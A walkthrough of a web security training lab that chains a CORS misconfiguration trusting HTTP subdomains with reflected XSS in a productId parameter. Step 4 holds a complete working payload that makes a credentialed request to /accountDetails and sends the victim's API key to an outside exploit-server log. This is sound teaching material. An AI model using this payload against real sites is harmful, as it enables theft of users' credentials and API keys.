# Lab Guide: CORS Vulnerability with Trusted Insecure Protocols

This guide demonstrates how to exploit a **CORS vulnerability** that trusts insecure HTTP subdomains, combined with an **XSS vulnerability**, to retrieve a victim’s API key using **Burp Suite**. Let’s get started!

---

## Objective
Exploit a CORS misconfiguration that trusts HTTP subdomains and leverage an XSS vulnerability in the `productId` parameter to steal the victim’s API key.

---

## Tools Needed
- **Burp Suite** (with Burp’s browser)
- **Repeater** module in Burp Suite
- **Exploit Server** (provided in the lab environment)
- Basic understanding of CORS, XSS, and JavaScript payloads

---

## Step-by-Step Instructions

### 1- Log In and Capture the Request
- Ensure **Intercept** is off in Burp Suite.
- Use **Burp’s browser** to log in and access your account page.
- In **Proxy > HTTP history**, locate the AJAX request to `/accountDetails`.
- Observe the **Access-Control-Allow-Credentials: true** header, indicating CORS support.
- **Right-click** the request and select **Send to Repeater**.

### 2- Test for Subdomain Origin Reflection
- In **Repeater**, add the header:
  ```
  Origin: http://stock.0a34000c0433503980320344007d0086.web-security-academy.net
  ```
- Resubmit the request and check the response.
- **Observation**: The response includes `Access-Control-Allow-Origin: http://stock.0a34000c0433503980320344007d0086.web-security-academy.net`, confirming the server trusts arbitrary subdomains, including HTTP.

### 3- Identify XSS Vulnerability
- Open a **product page** in the browser and click **Check stock**.
- Observe that the request uses an **HTTP URL** on a subdomain (e.g., `http://stock.0a34000c0433503980320344007d0086.web-security-academy.net`).
- Note that the `productId` parameter is vulnerable to **XSS**.

### 4- Craft the Exploit
- Navigate to the **Exploit Server** in the browser.
- Enter the following HTML, replacing `0a34000c0433503980320344007d0086` and `YOUR-EXPLOIT-SERVER-ID` with your lab-specific URLs:
  ```html
  <script>
      document.location="http://stock.0a34000c0433503980320344007d0086.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a34000c0433503980320344007d0086.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a22009904a2508b8035024101a8002e.exploit-server.net/log?key='+this.responseText; };%3c/script>&storeId=1"
  </script>
  ```
- **Note**: The XSS payload in `productId` executes a script that makes a cross-origin request to `/accountDetails`.

### 5- Test and Deliver the Exploit
- Click **View exploit** to verify the exploit works. You should land on the log page with the API key in the URL.
- Go back to the **Exploit Server** and click **Deliver exploit to victim**.
- Access the **Access log**, retrieve the victim’s API key, and submit it to complete the lab.